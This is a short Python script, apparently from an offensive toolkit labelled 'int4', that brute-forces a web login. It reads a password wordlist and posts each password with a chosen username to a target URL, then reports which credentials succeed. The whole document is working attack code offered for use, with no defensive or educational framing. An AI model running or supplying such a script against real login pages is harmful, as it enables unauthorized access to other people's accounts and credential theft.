#!/usr/bin/env python3
import requests

def brute_force_login(url, username, password_file):
    """[Perform brute-force login attempts using a wordlist]"""
    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        data = {'username': username, 'password': password}
        try:
            response = requests.post(url, data=data)
            if "success" in response.text.lower():  # Adjust based on actual success message
                print(f"Successful login with {username}:{password} at {url}")
                break
            else:
                print(f"Failed login attempt with {username}:{password}")
        except requests.exceptions.RequestException as e:
            print(f"Error during login attempt: {e}")

# User input
url = input("\033[91mint4 [Enter the Login URL] > \033[0m")
username = input("\033[91mint4 [Enter the Username] > \033[0m")
password_file = input("\033[91mint4 [Enter the Path to Your Password Wordlist] > \033[0m")
brute_force_login(url, username, password_file)